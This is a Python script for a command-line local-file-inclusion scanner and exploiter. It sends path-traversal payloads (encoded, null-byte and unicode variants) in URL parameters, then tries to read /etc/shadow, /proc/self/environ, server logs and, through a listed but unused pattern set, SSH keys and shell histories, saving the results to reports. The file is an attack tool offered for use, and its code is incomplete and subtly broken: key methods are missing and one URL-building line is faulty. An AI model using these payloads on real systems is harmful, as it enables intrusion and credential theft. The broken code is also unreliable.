import argparse
import requests
import urllib3
import json
import csv
import re
import sys
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL/TLS warnings for easier debugging
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LFIScanner:
    def __init__(self, proxy=None, threads=10, wordlist=None, username=None, password=None, cookies=None):
        self.unique_vulns = set()
        self.unique_entries = set()
        self.cookies = cookies
        self.session = self._create_session(proxy)  
        self.tested_combinations = set()
        self.visited_urls = set()
        self.payloads = self._generate_payloads()
        self.vulnerabilities = []
        self.base_domain = None
        self.threads = threads
        self.executor = ThreadPoolExecutor(max_workers=threads)
        self.exploitation_results = []
        self.exploit_files = [  # Exclude initial target files like /etc/passwd
            '/etc/shadow', '/etc/hosts', '/etc/group', '/proc/self/environ',
            '/proc/version', '/windows/win.ini', '/windows/system32/drivers/etc/hosts',
            '../../../../../../../../windows/system32/drivers/etc/hosts',
            'C:\\Windows\\System32\\drivers\\etc\\hosts', '/etc/httpd/logs/access_log',
            '/etc/httpd/logs/error_log', '/var/log/apache2/access.log',
            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
            '/var/log/nginx/error.log', '/var/log/httpd/error_log',
            '/var/www/logs/access_log', '/usr/local/apache2/logs/access_log',
            '/usr/local/apache2/logs/error_log'
        ]
        if wordlist:
            self._load_wordlist(wordlist)
        self.user_file_patterns = [
            '.bash_history',
            '.ssh/id_rsa',
            '.ssh/authorized_keys',
            '.mysql_history',
        ]

    def _load_wordlist(self, wordlist_path):
        try:
            with open(wordlist_path) as f:
                custom_files = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                normalized = [f'/{path.lstrip("/")}' if not path.startswith('/') else path for path in custom_files]
                self.exploit_files.extend(normalized)
                seen = set()
                self.exploit_files = [x for x in self.exploit_files if not (x in seen or seen.add(x))]
        except Exception as e:
            print(f"[!] Wordlist error: {str(e)}")
            sys.exit(1)
            
    def _add_entry(self, entry):
        entry_hash = hash(frozenset({
            'url': entry.get('url'),
            'parameter': entry.get('parameter'),
            'payload': unquote(entry.get('payload', '')),
            'target_file': entry.get('target_file', ''),
            'type': entry.get('type', 'discovery')
        }.items()))
        if entry_hash not in self.unique_entries:
            self.unique_entries.add(entry_hash)
            if entry.get('type') == 'exploitation':
                self.exploitation_results.append(entry)
            else:
                self.vulnerabilities.append(entry)

    def _create_session(self, proxy):
        session = requests.Session()
        session.verify = False
        retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        if self.cookies:
            cookie_dict = {}
            for cookie in self.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookie_dict[name] = value
            session.headers['Cookie'] = '; '.join([f'{k}={v}' for k,v in cookie_dict.items()])
        if proxy:
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        base_paths = [
            '/etc/passwd', '../etc/passwd', '../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '....\/....\/....\/etc/passwd',
            '%2e%2e%2f' * 6 + 'etc/passwd',
            '%252e%252e%252f' * 6 + 'etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),
            '..%255c..%255c..%255cwindows%255cwin.ini',
            '../../../etc/passwd%00.png',
            '../../../etc/passwd%00.jpg',
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%2500',
            '/var/www/images/../../../etc/passwd',
        ]
        encoded_paths = [quote(payload, safe='') for payload in base_paths]
        unicode_paths = [
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd'
        ]
        return list(set(base_paths + encoded_paths + unicode_paths))

    def scan(self, start_url):
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)
        self._exploit_vulnerabilities()
        return self.vulnerabilities + self.exploitation_results

    def _exploit_vulnerabilities(self):
        if not self.vulnerabilities:
            return
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for vuln in self.vulnerabilities:
                for target_file in self.exploit_files:
                    futures.append(executor.submit(
                        self._test_exploit,
                        vuln['url'], vuln['parameter'], 
                        vuln['payload'], target_file
                    ))
            for future in as_completed(futures):
                future.result()

    def _test_exploit(self, original_url, param, base_payload, target_file):
        try:
            exploit_payload = self._generate_exploit_payload(base_payload, target_file)
            if exploit_payload == base_payload:
                return None  # Skip duplicate payload
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [exploit_payload]
            test_url = parsed._replace(query="&".join([f"{k}={v[0]}" for k, v in query.items()]).geturl())
            response = self.session.get(test_url, timeout=15)
            if result := self._is_valid_exploitation(response):
                result_entry = {
                    'type': 'exploitation',
                    'url': test_url,
                    'parameter': param,
                    'target_file': target_file,
                    'payload': exploit_payload,
                    'content': response.text[:500] + '...' if response.text else '',
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                self._add_entry(result_entry) 
                return result_entry
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
        return None

    def _generate_exploit_payload(self, base_payload, target_file):
        decoded_payload = unquote(base_payload)
        target_path = target_file.lstrip('/')
        modified = decoded_payload.replace('etc/passwd', target_path)
        modified = modified.replace('/etc/passwd', target_path)
        return quote(modified)

    # Remaining methods (_crawl, _extract_url, _process_url, _analyze_parameters, etc.) remain unchanged

def main():
    parser = argparse.ArgumentParser(description="Advanced LFI Scanner")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-l", "--url-list", help="File containing list of URLs to test")
    parser.add_argument("-w", "--wordlist", help="Custom file path wordlist for exploitation")
    parser.add_argument("-p", "--proxy", help="Proxy server for traffic inspection")
    parser.add_argument("-o", "--output", choices=['json', 'csv'], help="Generate report in specified format")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads for scanning")
    parser.add_argument("--cookies", help="Session cookies in 'name1=value1; name2=value2' format")
    args = parser.parse_args()

    scanner = LFIScanner(
        proxy=args.proxy, 
        threads=args.threads,
        wordlist=args.wordlist,
        cookies=args.cookies
    )

    all_results = []
    try:
        start_urls = [args.url] if args.url else open(args.url_list).read().splitlines()
        for url in start_urls:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                print(f"[-] Skipping invalid URL: {url}")
                continue
            print(f"[+] Scanning URL: {url}")
            try:
                results = scanner.scan(url)
                all_results.extend(results)
            except Exception as e:
                print(f"[-] Error scanning {url}: {str(e)}")
            scanner.visited_urls = set()
            scanner.tested_combinations = set()
            scanner.vulnerabilities = []
            scanner.exploitation_results = []
            scanner.base_domain = None
        if args.output:
            output_file = f"report.{args.output}"
            if args.output == 'json':
                with open(output_file, 'w') as f:
                    json.dump(all_results, f, indent=2)
            else:
                with open(output_file, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['URL', 'Parameter', 'Payload', 'Status', 'Length', 'Timestamp'])
                    for vuln in all_results:
                        writer.writerow([
                            vuln.get('url'), vuln.get('parameter'),
                            vuln.get('payload'), vuln.get('status'),
                            vuln.get('length'), vuln.get('timestamp')
                        ])
            print(f"[*] Report saved to {output_file}")
        print(f"[*] Scan complete. Found {len(all_results)} vulnerabilities")
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
